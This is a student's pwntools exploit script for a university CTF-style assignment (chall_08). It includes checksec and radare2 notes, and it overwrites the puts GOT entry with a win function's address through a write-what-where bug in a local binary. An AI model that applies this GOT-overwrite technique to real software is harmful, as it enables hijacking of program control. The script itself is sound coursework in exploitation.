'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Project 2 --- chall_08
File Description:  First Write What Where (IMO Should be named Where What Write due to format)

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   68) Symbols       No    0               0               chall_08

File info:
chall_08: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e0482f3775e920c16018991b71b52cc573135d30, for GNU/Linux 3.2.0, not stripped

Radare2:
afl --> list all functions

r2 -Ad chall_08:
    Probably a Write-What-Where since NX and Canary are on
    Utilizing rabin2 -s chall_08 found a target address to use
    Uses number we put in thus find address and div by 8 --> where to return to, then call func
    After that bypass and call win func
    Only can do this due to PIE is off!
'''

# Import Libaries
from pwn import *

# Start elf
elf=ELF("./chall_08")

# AGet to where I want to go
putsAddr=0x404018
targetAddr=0x404050
offsetToGOT=(putsAddr-targetAddr)//8         # Where I want to be - Target location = add what to get to GOT
winFunc=elf.sym.win

# Start process and send payload
p=process("./chall_08")
p.sendline(b'%d' %winFunc)
p.sendline(b'%d' %offsetToGOT)
p.interactive()